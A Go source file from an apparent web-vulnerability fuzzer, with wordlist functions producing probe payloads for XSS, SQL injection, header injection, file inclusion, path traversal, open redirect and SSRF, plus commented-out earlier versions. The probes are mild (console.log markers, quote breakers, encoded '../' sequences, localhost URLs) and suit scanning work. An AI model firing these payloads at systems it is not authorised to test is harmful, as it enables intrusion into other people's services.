package fuzz

import "fmt"

func XssPayload(identifier string) []string {
	wordlist := []string{
		`<script>console.log("%s")</script>`,
		`<ScRiPt>console.log("%s")</ScRiPt>`,
		`<img src=x alt="%s">`,
		`<div data-x="%s"></div>`,
		`<!-- %s -->`,
	}

	return applyIdentifier(wordlist, identifier)
}

func XssPayloadExtreme(identifier string) []string {
	wordlist := []string{
		`<script>console.log("%s")</script>`,
		`<ScRiPt>console.log("%s")</ScRiPt>`,
		`<SCRIPT>console.log("%s")</SCRIPT>`,

		`<img src=x alt="%s">`,
		`<img src=x data-x="%s">`,
		`<div data-x="%s"></div>`,
		`<span title="%s"></span>`,
		`<textarea>%s</textarea>`,

		`<!-- %s -->`,
		`<!--<div>%s</div>-->`,

		`<svg data-x="%s"></svg>`,
		`<math data-x="%s"></math>`,

		`"%s"`,
		`'%s'`,
		"`%s`",

		`%s`,
		`%s% s`,
		`%s/`,
		`%s?x=1`,
		`%s#x`,
	}

	return applyIdentifier(wordlist, identifier)
}

func SqliPayload(identifier string) []string {
	wordlist := []string{
		`%s'`,
		`%s"`,
		`%s)`,
		`%s' )`,
		`%s\`,
	}

	return applyIdentifier(wordlist, identifier)
}

func SqliPayloadExtreme(identifier string) []string {
	wordlist := []string{
		`%s'`,
		`%s"`,
		`%s)`,
		`%s(`,
		`%s' )`,
		`%s" )`,
		`%s\`,
		`%s' --`,
		`%s" --`,
		`%s' #`,
		`%s" #`,
		`%s/*`,
		`%s*/`,
		`%s AND 1=1`,
		`%s AND 1=2`,
		`%s OR 1=1`,
		`%s OR 1=2`,
	}

	return applyIdentifier(wordlist, identifier)
}

func HeaderInjectionPayload(identifier string) []string {
	wordlist := []string{
		`%s`,
		`%s\r\nX-Test: injected`,
		`%s\nX-Test: injected`,
		`%s\rX-Test: injected`,
		`%s%0d%0aX-Test:%20injected`,
	}

	return applyIdentifier(wordlist, identifier)
}

func HeaderInjectionPayloadExtreme(identifier string) []string {
	wordlist := []string{
		`%s\r\nX-Test: injected`,
		`%s\nX-Test: injected`,
		`%s\rX-Test: injected`,

		`%s%0d%0aX-Test:%20injected`,
		`%s%0aX-Test:%20injected`,
		`%s%0dX-Test:%20injected`,

		`%s\r\nX-Test: %s`,
		`%s%0d%0aX-Test:%20%s`,

		`%s\r\n`,
		`%s%0d%0a`,
	}

	return applyIdentifier(wordlist, identifier)
}

func LfiPayload(identifier string) []string {
	wordlist := []string{
		`%s../`,
		`%s../../`,
		`%s../../../`,
		`%s..\`,
		`%s..\..\`,
	}

	return applyIdentifier(wordlist, identifier)
}

func LfiPayloadExtreme(identifier string) []string {
	wordlist := []string{
		`%s../`,
		`%s../../`,
		`%s../../../`,
		`%s../../../../`,
		`%s../../../../../`,

		`%s..\`,
		`%s..\..\`,
		`%s..\..\..\`,
		`%s..\..\..\..\`,

		`%s./`,
		`%s.././`,
		`%s..//`,
		`%s....//`,
		`%s..%2f`,
		`%s..%252f`,
		`%s%2e%2e%2f`,
	}

	return applyIdentifier(wordlist, identifier)
}

func RfiPayload(identifier string) []string {
	wordlist := []string{
		`%shttp://127.0.0.1/`,
		`%shttps://example.invalid/`,
		`%s//example.invalid/`,
		`%sfile://example.invalid/`,
		`%sdata:text/plain,%s`,
	}

	return applyIdentifier(wordlist, identifier)
}

func PathTraversalPayload(identifier string) []string {
	wordlist := []string{
		`%s../`,
		`%s../../`,
		`%s../../../`,
		`%s..\`,
		`%s..\..\`,
	}

	return applyIdentifier(wordlist, identifier)
}

func PathTraversalPayloadExtreme(identifier string) []string {
	wordlist := []string{
		`%s../`,
		`%s../../`,
		`%s../../../`,
		`%s../../../../`,
		`%s../../../../../`,

		`%s..\`,
		`%s..\..\`,
		`%s..\..\..\`,
		`%s..\..\..\..\`,

		`%s./../`,
		`%s.././`,
		`%s..//`,
		`%s....//`,

		`%s..%2f`,
		`%s..%2F`,
		`%s%2e%2e%2f`,
		`%s%2e%2e%2F`,

		`%s..%252f`,
		`%s%252e%252e%252f`,

		`%s%2e%2e/`,
		`%s.%2e/`,
		`%s%2e./`,

		`%s%5c..%5c`,
		`%s..%5c`,
	}

	return applyIdentifier(wordlist, identifier)
}

func OpenRedirectPayload(identifier string) []string {
	wordlist := []string{
		`https://example.com/%s`,
		`//example.com/%s`,
		`https://example.com`,
		`//example.com`,
		`/%s`,
	}

	return applyIdentifier(wordlist, identifier)
}

func OpenRedirectPayloadExtreme(identifier string) []string {
	wordlist := []string{
		`https://example.com/%s`,
		`http://example.com/%s`,
		`//example.com/%s`,
		`https://example.com`,
		`//example.com`,

		`https://example.com?x=%s`,
		`//example.com?x=%s`,

		`https:%2f%2fexample.com`,
		`http:%2f%2fexample.com`,
		`%2f%2fexample.com`,

		`https%3A%2F%2Fexample.com`,
		`%2F%2Fexample.com`,

		`https://example.com/%2e%2e/%s`,
		`//example.com/%2e%2e/%s`,
	}

	return applyIdentifier(wordlist, identifier)
}

func SSRFPayload(identifier string) []string {
	wordlist := []string{
		`http://127.0.0.1/%s`,
		`http://localhost/%s`,
		`http://[::1]/%s`,
		`http://example.com/%s`,
		`https://example.com/%s`,
	}

	return applyIdentifier(wordlist, identifier)
}

func SSRFPayloadExtreme(identifier string) []string {
	wordlist := []string{
		`http://127.0.0.1/%s`,
		`http://localhost/%s`,
		`http://[::1]/%s`,

		`http://127.0.0.1:80/%s`,
		`http://127.0.0.1:8080/%s`,
		`http://localhost:80/%s`,
		`http://localhost:8080/%s`,

		`http://example.com/%s`,
		`https://example.com/%s`,
		`//example.com/%s`,

		`http://127.0.0.1/%2e%2e/%s`,
		`http://localhost/%2e%2e/%s`,

		`http://127.0.0.1#%s`,
		`http://localhost#%s`,

		`http://127.0.0.1?x=%s`,
		`http://localhost?x=%s`,
	}

	return applyIdentifier(wordlist, identifier)
}

func applyIdentifier(wordlist []string, identifier string) []string {
	results := make([]string, 0, len(wordlist))

	for _, word := range wordlist {
		results = append(results, fmt.Sprintf(word, identifier))
	}

	return results
}

// func PathTraversalPayload(target string) []string {
// 	wordlist := []string{
// 		`../%s`,
// 		`../../%s`,
// 		`../../../%s`,
// 		`..\%s`,
// 		`..\..\%s`,
// 	}

// 	return applyIdentifier(wordlist, target)
// }

// func PathTraversalPayloadExtreme(target string) []string {
// 	wordlist := []string{
// 		`../%s`,
// 		`../../%s`,
// 		`../../../%s`,
// 		`../../../../%s`,
// 		`../../../../../%s`,

// 		`..\%s`,
// 		`..\..\%s`,
// 		`..\..\..\%s`,
// 		`..\..\..\..\%s`,

// 		`./../%s`,
// 		`.././%s`,
// 		`..//%s`,
// 		`....//%s`,

// 		`..%2f%s`,
// 		`..%2F%s`,
// 		`%2e%2e%2f%s`,
// 		`%2e%2e%2F%s`,

// 		`..%252f%s`,
// 		`%252e%252e%252f%s`,

// 		`%2e%2e/%s`,
// 		`.%2e/%s`,
// 		`%2e./%s`,

// 		`%5c..%5c%s`,
// 		`..%5c%s`,
// 	}

// 	return applyIdentifier(wordlist, target)
// }

// func OpenRedirectPayload(target string) []string {
// 	wordlist := []string{
// 		`https://example.com/%s`,
// 		`http://example.com/%s`,
// 		`//example.com/%s`,
// 		`/%s`,
// 		`%s`,
// 	}

// 	return applyIdentifier(wordlist, target)
// }

// func OpenRedirectPayloadExtreme(target string) []string {
// 	wordlist := []string{
// 		`https://example.com/%s`,
// 		`http://example.com/%s`,
// 		`//example.com/%s`,
// 		`https://example.com`,
// 		`//example.com`,

// 		`https://example.com?x=%s`,
// 		`//example.com?x=%s`,

// 		`https:%2f%2fexample.com/%s`,
// 		`http:%2f%2fexample.com/%s`,
// 		`%2f%2fexample.com/%s`,

// 		`https%3A%2F%2Fexample.com/%s`,
// 		`%2F%2Fexample.com/%s`,
// 	}

// 	return applyIdentifier(wordlist, target)
// }

// func SSRFPayload(target string) []string {
// 	wordlist := []string{
// 		`http://127.0.0.1/%s`,
// 		`http://localhost/%s`,
// 		`http://[::1]/%s`,
// 		`https://example.com/%s`,
// 		`//example.com/%s`,
// 	}

// 	return applyIdentifier(wordlist, target)
// }

// func SSRFPayloadExtreme(target string) []string {
// 	wordlist := []string{
// 		`http://127.0.0.1/%s`,
// 		`http://localhost/%s`,
// 		`http://[::1]/%s`,

// 		`http://127.0.0.1:80/%s`,
// 		`http://127.0.0.1:8080/%s`,
// 		`http://localhost:80/%s`,
// 		`http://localhost:8080/%s`,

// 		`https://example.com/%s`,
// 		`http://example.com/%s`,
// 		`//example.com/%s`,

// 		`http://127.0.0.1?x=%s`,
// 		`http://localhost?x=%s`,
// 	}

// 	return applyIdentifier(wordlist, target)
// }
